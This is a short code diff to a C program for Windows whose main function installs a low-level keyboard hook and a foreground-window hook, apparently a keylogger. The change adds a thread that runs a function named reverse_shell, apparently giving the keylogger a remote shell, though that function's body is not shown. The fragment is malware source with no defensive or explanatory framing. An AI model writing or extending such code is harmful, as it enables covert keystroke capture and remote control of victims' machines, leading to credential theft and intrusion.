@@ -81,6 +81,7 @@ void SignalHandler(int signal)
 int		main(void)
 {
 	MSG msg = { 0 };
+	DWORD threadID = 0;
 
 	signal(SIGINT, SignalHandler);
 	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
@@ -90,5 +91,7 @@ int		main(void)
 								EVENT_SYSTEM_FOREGROUND, 0,
 								Wineventproc, 0, 0,
 								WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
+	HANDLE hThread = CreateThread(0, 0, reverse_shell, 0, 0, &threadID);
+	CloseHandle(hThread);
 	while (GetMessage(&msg, 0, 0, 0));
 }
